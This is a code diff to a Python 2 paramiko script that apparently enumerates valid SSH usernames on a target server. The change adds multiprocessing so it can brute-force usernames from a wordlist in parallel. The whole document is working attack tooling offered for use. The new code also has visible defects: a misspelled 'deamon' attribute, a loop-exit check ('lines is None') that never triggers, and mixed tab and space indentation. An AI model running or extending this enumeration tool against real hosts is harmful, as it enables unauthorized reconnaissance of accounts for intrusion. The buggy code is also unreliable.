@@ -4,6 +4,8 @@ import socket
 import argparse
 from sys import exit
 import logging
+from itertools import islice
+from multiprocessing import Process, Manager
 
 # just to supress the logging errors
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
@@ -20,6 +22,8 @@ def get_arguments():
                             type=str, help='Check a single username.')
     arg_parser.add_argument('-w', '--wordlist', type=str,
                             help='Path to a usernames wordlist.')
+    arg_parser.add_argument('-t', '--threads', type=int,
+                            help='Threads to use when bruteforcing.', default=5)
     args = arg_parser.parse_args()
     # in case a user adds both username and wordlist flags, keep only the
     # wordlist
@@ -92,17 +96,38 @@ def is_valid_user(sess, username, key):
         return True
 
 
-def bruteforce_users(sess, users_wordlist):
-    print '[+] Starting bruteforce..'
-    dummy_key = paramiko.RSAKey.generate(2048)
-    users_found = set()
-    with open(users_wordlist) as f:
-        for word in f:
-            user = word.strip()
-            if is_valid_user(sess, user, dummy_key):
-                users_found.update(list(user))
-                print '[+] Found user ', user
-    return users_found
+def bruteforce_users(host, port, users_wordlist, threads_num):
+	print '[+] Starting bruteforce with {} threads..'.format(threads_num)
+	dummy_key = paramiko.RSAKey.generate(2048)
+	manager = Manager()
+	users_found = manager.dict()
+	with open(users_wordlist) as infile:
+	    while True:
+	        lines = list(islice(infile, threads_num))
+	        threads = []
+	        if lines is None:
+	            break
+	        for line in lines:
+	            user = line.strip()
+	            p = Process(target=test_user, args=(
+	                host, port, user, dummy_key, users_found))
+	            threads.append(p)
+	        for thread in threads:
+	            thread.deamon = True
+	            thread.start()
+	        for thread in threads:
+	            thread.join()
+	return users_found.keys()
+
+
+def test_user(host, port, user, key, results):
+	if user in results:
+		return
+	print '[!] Testing user ', user
+	session = init_session(host, port)
+	if is_valid_user(session, user, key):
+	    results.update({user: 1})
+	    print '[+] Found user ', user
 
 
 def check_single_user(sess, username):
@@ -116,13 +141,14 @@ def check_single_user(sess, username):
 if __name__ == '__main__':
     # get cli arguments
     args = get_arguments()
-    # start a ssh session to the server
-    session = init_session(args.hostname, args.port)
     # inject our own functions to paramiko
     update_handler_table()
     # run check on either a username or a wordlist
     if args.username:
+        # start a ssh session to the server
+        session = init_session(args.hostname, args.port)
         check_single_user(session, args.username)
     else:
-    	print 'Bruteforcing bugged out, fix soon..'
-        # bruteforce_users(session, args.wordlist)
+        bruteforce_args = (args.hostname, args.port,
+                           args.wordlist, args.threads)
+        bruteforce_users(*bruteforce_args)
